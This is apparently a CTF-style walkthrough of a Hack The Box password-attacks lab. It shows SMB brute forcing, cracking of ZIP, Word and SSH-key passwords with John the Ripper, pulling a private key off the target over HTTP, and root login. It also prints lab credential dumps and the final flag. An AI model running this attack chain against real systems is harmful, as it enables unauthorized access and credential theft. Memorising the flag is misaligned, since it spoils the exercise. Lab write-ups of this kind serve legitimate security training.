Our next host is a workstation used by an employee for their day-to-day work. These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network. During a meeting with the client, we were informed that many internal users use this host as a jump host. The focus is on securing and protecting files containing sensitive information.

  

Examine the second target and submit the contents of flag.txt in /root/ as the answer.

  

1. Nmap Scan

```Bash
ot㉿kali)-[/home/kali]
└─# nmap -T4 10.129.241.226
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-05 12:43 EDT
Nmap scan report for 10.129.241.226
Host is up (0.44s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

1. Try and crack the SMB Service with Hydra

```Bash
┌──(root㉿kali)-[/home/kali/Password_Attacks/MEDIUM]
└─# hydra -L username.list -P password smb://10.129.241.226
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-05 12:47:06
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[ERROR] File for passwords not found: password
```

- We get an error cracking SMB with Hydra
- Lets try with Metasploit

1. Crack SMB with Metasploit

```Bash
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE username.list
USER_FILE => username.list
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE password.list
PASS_FILE => password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.241.226
rhosts => 10.129.241.226
msf6 auxiliary(scanner/smb/smb_login) > 
```

1. SMB Cracked

```Bash
[*] 10.129.241.226:445    - 10.129.241.226:445 - Starting SMB login bruteforce
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\john:123456'
[!] 10.129.241.226:445    - No active DB -- Credential data will not be saved!
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\dennis:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\chris:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\cassie:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\admin:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\root:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\sysadmin:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\sysadm:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\svc:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\administrator:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\helpdesk:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\reception:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\finance:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\its:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\ict:123456'
[+] 10.129.241.226:445    - 10.129.241.226:445 - Success: '.\hr:123456'
[-] 10.129.241.226:445    - 10.129.241.226:445 - Failed: '.\sam:123456',
[-] 10.129.241.226:445    - 10.129.241.226:445 - Failed: '.\sam:12345',
[-] 10.129.241.226:445    - 10.129.241.226:445 - Failed: '.\sam:123456789',
^C[*] 10.129.241.226:445    - Caught interrupt from the console...
[-] 10.129.241.226:445    - Auxiliary failed: NoMethodError undefined method `flat_map' for nil:NilClass
[-] 10.129.241.226:445    - Call stack:
[-] 10.129.241.226:445    -   /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_login.rb:95:in `run'
[*] Auxiliary module execution completed
```

1. Lets try and enumerate files
    
    - Enumerate SMB shares with CrackmapExec
        
        ```Bash
        crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
        ```
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks/MEDIUM]
        └─# crackmapexec smb 10.129.241.226 -u "root" -p "123456" --shares
        SMB         10.129.241.226  445    SKILLS-MEDIUM    [*] Windows 6.1 Build 0 (name:SKILLS-MEDIUM) (domain:) (signing:False) (SMBv1:False)
        SMB         10.129.241.226  445    SKILLS-MEDIUM    [+] \root:123456 
        SMB         10.129.241.226  445    SKILLS-MEDIUM    [+] Enumerated shares
        SMB         10.129.241.226  445    SKILLS-MEDIUM    Share           Permissions     Remark
        SMB         10.129.241.226  445    SKILLS-MEDIUM    -----           -----------     ------
        SMB         10.129.241.226  445    SKILLS-MEDIUM    print$                          Printer Drivers
        SMB         10.129.241.226  445    SKILLS-MEDIUM    SHAREDRIVE      READ            SHARE-DRIVE
        SMB         10.129.241.226  445    SKILLS-MEDIUM    IPC$                            IPC Service (skills-medium server (Samba, Ubuntu))
        ```
        
    - Lets see whats inside the SHAREDRIVE with smbclient
        
        ```Bash
        smbclient -U user \\\\10.129.42.197\\SHARENAME
        ```
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks/MEDIUM]
        └─# smbclient -U root \\\\10.129.241.226\\SHAREDRIVE
        Password for [WORKGROUP\root]:
        Try "help" to get a list of possible commands.
        smb: \> ls
          .                                   D        0  Thu Feb 10 05:39:38 2022
          ..                                  D        0  Thu Feb 10 05:35:54 2022
          Docs.zip                            N     6724  Thu Feb 10 05:39:38 2022
        
                        14384136 blocks of size 1024. 10222612 blocks available
        smb: \> help
        ?              allinfo        altname        archive        backup         
        blocksize      cancel         case_sensitive cd             chmod          
        chown          close          del            deltree        dir            
        du             echo           exit           get            getfacl        
        geteas         hardlink       help           history        iosize         
        lcd            link           lock           lowercase      ls             
        l              mask           md             mget           mkdir          
        mkfifo         more           mput           newer          notify         
        open           posix          posix_encrypt  posix_open     posix_mkdir    
        posix_rmdir    posix_unlink   posix_whoami   print          prompt         
        put            pwd            q              queue          quit           
        readlink       rd             recurse        reget          rename         
        reput          rm             rmdir          showacls       setea          
        setmode        scopy          stat           symlink        tar            
        tarmode        timeout        translate      unlock         volume         
        vuid           wdel           logon          listconnect    showconnect    
        tcon           tdis           tid            utimes         logoff         
        ..             !              
        smb: \> get Docs.zip
        getting file \Docs.zip of size 6724 as Docs.zip (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
        smb: \> 
        ```
        
    
    1. Lets view the contents of the zip file
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali]
        └─# unzip Docs.zip 
        Archive:  Docs.zip
        [Docs.zip] Documentation.docx password:
        ```
        
        - The zip file is password protected
        - lets crack it
    2. Cracking the zip document with zip2john 
        
        ```Bash
        zip2john ZIP.zip > zip.hash
        john --wordlist=rockyou.txt zip.hash
        john zip.hash --show
        ```
        
    3. Download the resources from HTB
        
        ```Bash
        wget link_to_resource
        ```
        
    4. Create a mutated wordlist
        
        ```Bash
        hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
        ```
        
    5. Crack the Zip file with John
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# john --wordlist=mut_password.list Docs.hash 
        Using default input encoding: UTF-8
        Loaded 1 password hash (PKZIP [32/64])
        Will run 8 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        Destiny2022!     (Docs.zip/Documentation.docx)     
        1g 0:00:00:00 DONE (2025-05-06 11:19) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s br@ndon2015!..F00tb@ll81
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed.
        ```
        
    6. Unzip and View the contents of the file
        
        ```Bash
        (root㉿kali)-[/home/kali/Password_Attacks]
        └─# john Docs.hash --show     
        Docs.zip/Documentation.docx:Destiny2022!:Documentation.docx:Docs.zip::Docs.zip
        
        1 password hash cracked, 0 left
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# unzip Docs.zip       
        Archive:  Docs.zip
        [Docs.zip] Documentation.docx password: 
          inflating: Documentation.docx      
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ls
        custom.rule  Docs.zip            EASY    MEDIUM             Password              password.list  username.list
        Docs.hash    Documentation.docx  id_rsa  mut_password.list  Password-Attacks.zip  Password.zip
        ```
        
    7. Open the unzipped Documentation.docx file
        
        1. I hosted a python http.server on my kali machine
        2. I port forwarded using ngrok
        3. I then downloaded it on my Windows Machine
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# python3 -m http.server 8080                                                
        Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
        ```
        
        ```Bash
        ngrok                                                                                               (Ctrl+C to quit)
                                                                                                                            
        🛡 Protect endpoints w/ IP Intelligence: https://ngrok.com/r/ipintel                                                 
                                                                                                                            
        Session Status                online                                                                                
        Account                       random (Plan: Free)                                                                   
        Version                       3.22.1                                                                                
        Region                        India (in)                                                                            
        Latency                       253ms                                                                                 
        Web Interface                 http://127.0.0.1:4040                                                                 
        Forwarding                    https://8bd0-41-86-49-44.ngrok-free.app -> http://localhost:8080                      
                                                                                                                            
        Connections                   ttl     opn     rt1     rt5     p50     p90                                           
                                      11      0       0.03    0.02    0.01    0.03 
        ```
        
        ![[/image 72.png|image 72.png]]
        
    8. Opening the Documentation File
        - When opening it, it seems that it is windows protected
        - Lets try and crack it
            
            ![[/image 1 18.png|image 1 18.png]]
            
    9. Lets use office2john and john to crack the document password
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ls
        custom.rule  Docs.zip            EASY    MEDIUM             Password              password.list  username.list
        Docs.hash    Documentation.docx  id_rsa  mut_password.list  Password-Attacks.zip  Password.zip
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# office2john Documentation.docx > protected-doc.hash
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# john protected-doc.hash --wordlist=mut_password.list 
        Using default input encoding: UTF-8
        Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
        Cost 1 (MS Office version) is 2007 for all loaded hashes
        Cost 2 (iteration count) is 50000 for all loaded hashes
        Will run 8 OpenMP threads
        
        Press 'q' or Ctrl-C to abort, almost any other key for status
        0g 0:00:00:01 3.46% (ETA: 11:33:07) 0g/s 3421p/s 3421c/s 3421C/s 85!..98765401
        987654321        (Documentation.docx)     
        1g 0:00:00:01 DONE (2025-05-06 11:32) 0.9523g/s 3413p/s 3413c/s 3413C/s 9876542017!..98765432109
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed. 
        ```
        
        ```Bash
        root㉿kali)-[/home/kali/Password_Attacks]
        └─# john protected-doc.hash --show                       
        Documentation.docx:987654321
        
        1 password hash cracked, 0 left
        ```
        
    10. Open and view the contents of the document file
        
        ![[/image 2 15.png|image 2 15.png]]
        
        - Viewing the contents of the document we identified a root user and password
        
        ```Bash
        jason:C4mNKjAtL2dydsYa6
        ```
        
        - We also see mentions of MySQL, could that mean that SQL is in play?
        - We can try and SSH to the server and try access MySQL
    11. SSH into the machine with the identified username and password
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ssh jason@10.129.221.132
        The authenticity of host '10.129.221.132 (10.129.221.132)' can't be established.
        ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
        This host key is known by the following other names/addresses:
            ~/.ssh/known_hosts:5: [hashed name]
            ~/.ssh/known_hosts:7: [hashed name]
            ~/.ssh/known_hosts:8: [hashed name]
            ~/.ssh/known_hosts:9: [hashed name]
            ~/.ssh/known_hosts:10: [hashed name]
        Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
        Warning: Permanently added '10.129.221.132' (ED25519) to the list of known hosts.
        jason@10.129.221.132's password: 
        Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
        
         * Documentation:  https://help.ubuntu.com
         * Management:     https://landscape.canonical.com
         * Support:        https://ubuntu.com/advantage
        
          System information as of Tue 06 May 2025 03:39:46 PM UTC
        
          System load:  0.04               Processes:               180
          Usage of /:   26.8% of 13.72GB   Users logged in:         0
          Memory usage: 30%                IPv4 address for ens192: 10.129.221.132
          Swap usage:   0%
        
         * Super-optimized for small spaces - read how we shrank the memory
           footprint of MicroK8s to make it the smallest full K8s around.
        
           https://ubuntu.com/blog/microk8s-memory-optimisation
        
        0 updates can be applied immediately.
        
        
        The list of available updates is more than a week old.
        To check for new updates run: sudo apt update
        Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
        applicable law.
        
        
        Last login: Fri Mar 25 13:02:38 2022 from 10.129.202.221
        jason@skills-medium:~$ 
        ```
        
        - The credentials work
        - now lets enumerate further
    12. Log into MySQL as Jason
        
        ```Bash
        jason@skills-medium:~$ mysql -u jason -p
        Enter password: 
        Welcome to the MySQL monitor.  Commands end with ; or \g.
        Your MySQL connection id is 9
        Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
        
        Copyright (c) 2000, 2022, Oracle and/or its affiliates.
        
        Oracle is a registered trademark of Oracle Corporation and/or its
        affiliates. Other names may be trademarks of their respective
        owners.
        
        Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
        
        mysql> 
        ```
        
    13. Enumerate MySQL
        
        ```Bash
        mysql> show databases;
        +--------------------+
        | Database           |
        +--------------------+
        | information_schema |
        | users              |
        +--------------------+
        2 rows in set (0.01 sec)
        
        mysql> use database users;
        ERROR 1044 (42000): Access denied for user 'jason'@'localhost' to database 'database'
        mysql> use users;
        Reading table information for completion of table and column names
        You can turn off this feature to get a quicker startup with -A
        
        Database changed
        mysql> show tables;
        +-----------------+
        | Tables_in_users |
        +-----------------+
        | creds           |
        +-----------------+
        1 row in set (0.00 sec)
        
        mysql> select * from creds;
        +-----+--------------------+----------------+
        | id  | name               | password       |
        +-----+--------------------+----------------+
        |   1 | Hiroko Monroe      | YJE25AGN4CX    |
        |   2 | Shelley Levy       | GOK34QLM1DT    |
        |   3 | Uriel Velez        | OAY05YXS1XN    |
        |   4 | Vanna Benton       | EAU86WAY1BY    |
        |   5 | Philip Morales     | ONC53GFI2ID    |
        |   6 | Joshua Morgan      | AHJ46CDW4LH    |
        |   7 | Hadley Hanson      | YVD16TIY3QI    |
        |   8 | Branden Moses      | ZBE71RLJ5HN    |
        |   9 | Pandora Sears      | WYP33WEF5GY    |
        |  10 | Orla Lambert       | MLZ15XKR8SF    |
        |  11 | Maite Moran        | FOS06OOU2DF    |
        |  12 | Cassandra Mccarthy | SIB53CEH5DE    |
        |  13 | Leroy Sullivan     | HIC68RBH5EI    |
        |  14 | Wyoming Quinn      | LJM77SJC6BN    |
        |  15 | Asher Wise         | HHP00OHN8OD    |
        |  16 | Shelby Garrison    | SOI55QEP2QC    |
        |  17 | Garth Landry       | YOX30FPX2UK    |
        |  18 | Cailin Lang        | VYE12SKJ3BG    |
        |  19 | Tyrone Gross       | GCM52PLH8LH    |
        |  20 | Moana Bernard      | EMK37PGI1BC    |
        |  21 | Nell Forbes        | YXY78WCW4GX    |
        |  22 | Acton Mccormick    | RSI82CFW9QR    |
        |  23 | Odessa Knapp       | CXR22UOP5PV    |
        |  24 | Gary Phelps        | KDN93TNB6IB    |
        |  25 | Jonah Byrd         | GWK11PET1YK    |
        |  26 | Lewis Clements     | ACJ89KMH8IX    |
        |  27 | Hasad Dejesus      | GSH56VRQ3FD    |
        |  28 | Naomi Guerra       | YJY12IMO3YJ    |
        |  29 | Renee Levine       | UAT22NOU6JJ    |
        |  30 | Dieter Terry       | KPE74PKB7BE    |
        |  31 | Lucas Cooper       | JQY67QCL3SG    |
        |  32 | Reece Cherry       | TGV05UOE4MW    |
        |  33 | Len Olsen          | SQT66ETU2ML    |
        |  34 | Amir Booth         | SNA73SNK1CZ    |
        |  35 | Logan Burnett      | BDY84TGX7WC    |
        |  36 | Quinn Mcintyre     | UEL46HQC8PI    |
        |  37 | Harding Garrison   | MUT33ERW8PN    |
        |  38 | Addison Ellison    | RYR75LXH4WI    |
        |  39 | Anne Rose          | IOI62GUK7KK    |
        |  40 | Alika Richmond     | GUK64BKH7NJ    |
        |  41 | Kennan Hopkins     | AKE20VJV3TK    |
        |  42 | Katell Pace        | KDK46LGC3TS    |
        |  43 | Shoshana Murray    | TDX83THW8CG    |
        |  44 | Erasmus Brewer     | MBN41SYM4SC    |
        |  45 | Lewis Bryan        | DDI16XVP2LF    |
        |  46 | Yoko Bryan         | ISE37BPH4HE    |
        |  47 | Karleigh York      | JYU77OSI6XM    |
        |  48 | Brennan Nelson     | LUM81UWX3EX    |
        |  49 | Quintessa Hughes   | OCE13YLK4YU    |
        |  50 | Clinton Pugh       | LYM63FLG3WJ    |
        |  51 | Aaron Duncan       | EXI67QKU1DV    |
        |  52 | Rebekah Boyle      | TSU58EWW7AV    |
        |  53 | Inga Pickett       | LBI88TBG8FG    |
        |  54 | Nelle Harmon       | SCS45PQE2SF    |
        |  55 | Lee Hendrix        | WCF07LWQ7DI    |
        |  56 | Zane Reid          | WHM08PCI6YJ    |
        |  57 | Neil Santos        | VFP69WHB8QJ    |
        |  58 | Hilda Cameron      | ECP57KJV6GF    |
        |  59 | Kasper Franklin    | CUB01RJE1TV    |
        |  60 | Lamar Ellison      | ECD63FEI7EC    |
        |  61 | Oliver Collier     | UAK54DNB5NU    |
        |  62 | Jeanette Stewart   | HCY40SWK4TS    |
        |  63 | Dean Hale          | FYX44JDS3FW    |
        |  64 | Jasper Walter      | UHE24MXN7UY    |
        |  65 | Tasha Nguyen       | LIC48RCT5XL    |
        |  66 | Hamilton Lynch     | DBL85UPK4WA    |
        |  67 | Mariko Harris      | VSH42HZG2NI    |
        |  68 | Caleb Wooten       | RQK77XPZ3UM    |
        |  69 | Adele Glenn        | CEH74EIK1HP    |
        |  70 | Alvin Lambert      | IYI54DJF1VW    |
        |  71 | Barbara Roman      | TYV58TDS0VW    |
        |  72 | Naida Arnold       | SLS89ENT3CE    |
        |  73 | Rebekah Alexander  | YRR18NTB0SI    |
        |  74 | Chava Durham       | CRO01QSG2QS    |
        |  75 | Ainsley Pittman    | HYY51CZI5IP    |
        |  76 | Danielle Howell    | MGQ65TBI1IH    |
        |  77 | Cairo Dale         | QKY37WGY6PK    |
        |  78 | Kathleen Fulton    | QWA22ZTE7FK    |
        |  79 | Kelsie Mcpherson   | BQP07JMR6HP    |
        |  80 | Bevis Herman       | SOR60URB2NJ    |
        |  81 | Mufutau Baldwin    | QBB25FTD7HV    |
        |  82 | Genevieve Ryan     | KON69QNC5UQ    |
        |  83 | Lucius Wall        | JVX56EQT7YI    |
        |  84 | Cassidy Gutierrez  | KLZ78QIH6KH    |
        |  85 | Aladdin Fisher     | KYS21TWU3GS    |
        |  86 | Paul Lancaster     | WDW24NGN8KA    |
        |  87 | Jael Roberts       | MML82LOC4FN    |
        |  88 | Zena Solomon       | DJN31MHH6UV    |
        |  89 | Josephine Garza    | UWZ57ZKM1IV    |
        |  90 | Jason Norman       | ISO35HVC2BW    |
        |  91 | Rajah Ellison      | TIY46YPJ5TA    |
        |  92 | Colt Ferrell       | YCX56EKU9QO    |
        |  93 | Brenna Kinney      | FGD21LBQ6IS    |
        |  94 | Valentine Mcdowell | XIP27KBN6KL    |
        |  95 | Alexander Keith    | CJT35RAJ7DC    |
        |  96 | Charles Bell       | FAG53RFK7TH    |
        |  97 | Justina Greer      | YPG28SUE4JD    |
        |  98 | Elton Wallace      | SGH05RBW1YL    |
        |  99 | Jamalia Byers      | KVE47IWE5UF    |
        | 100 | Lael Rivers        | YNQ63NWP1RD    |
        | 101 | dennis             | 7AUgWWQEiMPdqx |
        +-----+--------------------+----------------+
        101 rows in set (0.01 sec)
        
        mysql> 
        ```
        
    14. SSH into Dennis 
        
        ```Bash
        ssh dennis@10.129.221.132
        ```
        
    15. Enumerate this user ssh session
        
        ```Bash
        skills-medium:~$ ls -la
        total 40
        drwxr-xr-x 5 dennis dennis 4096 Mar 25  2022 .
        drwxr-xr-x 4 root   root   4096 Feb 10  2022 ..
        -rw------- 1 dennis dennis  143 Mar 25  2022 .bash_history
        -rw-r--r-- 1 dennis dennis  220 Feb 25  2020 .bash_logout
        -rw-r--r-- 1 dennis dennis 3771 Feb 25  2020 .bashrc
        drwx------ 2 dennis dennis 4096 Mar 25  2022 .cache
        drwx------ 3 dennis dennis 4096 Mar 25  2022 .config
        -rw-r--r-- 1 dennis dennis  807 Feb 25  2020 .profile
        drwx------ 2 dennis dennis 4096 Feb 10  2022 .ssh
        -rw------- 1 dennis dennis  876 Feb 10  2022 .viminfo
        ```
        
        - there is a .ssh
        - there is a .bash_history
    16. Lets download the id_rsa on our attacker machine
        
        ```Bash
        dennis@skills-medium:~/.ssh$ python3 -m http.server 8080
        Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
        10.10.15.77 - - [06/May/2025 15:50:33] "GET /id_rsa HTTP/1.1" 200 -
        
        
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# wget http://10.129.221.132:8080/id_rsa
        --2025-05-06 11:48:05--  http://10.129.221.132:8080/id_rsa
        Connecting to 10.129.221.132:8080... connected.
        HTTP request sent, awaiting response... 200 OK
        Length: 2546 (2.5K) [application/octet-stream]
        Saving to: ‘id_rsa.1’
        
        id_rsa.1                     100%[==============================================>]   2.49K  --.-KB/s    in 0.1s    
        
        2025-05-06 11:48:06 (25.5 KB/s) - ‘id_rsa.1’ saved [2546/2546]
        
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ls
        custom.rule  Documentation.docx  id_rsa.1           Password              Password.zip
        Docs.hash    EASY                MEDIUM             Password-Attacks.zip  protected-doc.hash
        Docs.zip     id_rsa              mut_password.list  password.list         username.list
        ```
        
    17. Crack the password on the id_rsa ssh key file
        
        - Use ssh2john to convert the ssh key into hash
        - Crack the hash with John
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ssh2john id_rsa > id_rsa.hash
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ls
        custom.rule  Documentation.docx  id_rsa.1     mut_password.list     password.list       username.list
        Docs.hash    EASY                id_rsa.hash  Password              Password.zip
        Docs.zip     id_rsa              MEDIUM       Password-Attacks.zip  protected-doc.hash
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ssh2john id_rsa > id_rsa.hash    
                                                                                                                            
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# john id_rsa.hash --wordlist=mut_password.list 
        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
        Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
        Cost 2 (iteration count) is 1 for all loaded hashes
        Will run 8 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        P@ssw0rd12020!   (id_rsa)     
        1g 0:00:00:00 DONE (2025-05-06 11:53) 7.692g/s 548923p/s 548923c/s 548923C/s P@ssw0rd12000..P@ssw0rd12021
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed. 
        
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# john id_rsa.hash --show                      
        id_rsa:P@ssw0rd12020!
        
        1 password hash cracked, 0 left
        
        ```
        
    18. Log in as root with the new ssh key
        
        ```Bash
        ┌──(root㉿kali)-[/home/kali/Password_Attacks]
        └─# ssh root@10.129.221.132 -i id_rsa
        Enter passphrase for key 'id_rsa': 
        Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
        
         * Documentation:  https://help.ubuntu.com
         * Management:     https://landscape.canonical.com
         * Support:        https://ubuntu.com/advantage
        
          System information as of Tue 06 May 2025 03:57:10 PM UTC
        
          System load:  0.01               Processes:               193
          Usage of /:   26.9% of 13.72GB   Users logged in:         2
          Memory usage: 34%                IPv4 address for ens192: 10.129.221.132
          Swap usage:   0%
        
         * Super-optimized for small spaces - read how we shrank the memory
           footprint of MicroK8s to make it the smallest full K8s around.
        
           https://ubuntu.com/blog/microk8s-memory-optimisation
        
        0 updates can be applied immediately.
        
        
        The list of available updates is more than a week old.
        To check for new updates run: sudo apt update
        Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
        applicable law.
        
        Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
        
        
        Last login: Fri Mar 25 15:41:38 2022 from 10.129.202.106
        root@skills-medium:~# 
        ```
        
    19. Lets f*** this shit up
        
        ```Bash
        Last login: Fri Mar 25 15:41:38 2022 from 10.129.202.106
        root@skills-medium:~# ls
        flag.txt  snap
        root@skills-medium:~# cat flag.txt
        HTB{PeopleReuse_PWsEverywhere!}
        ```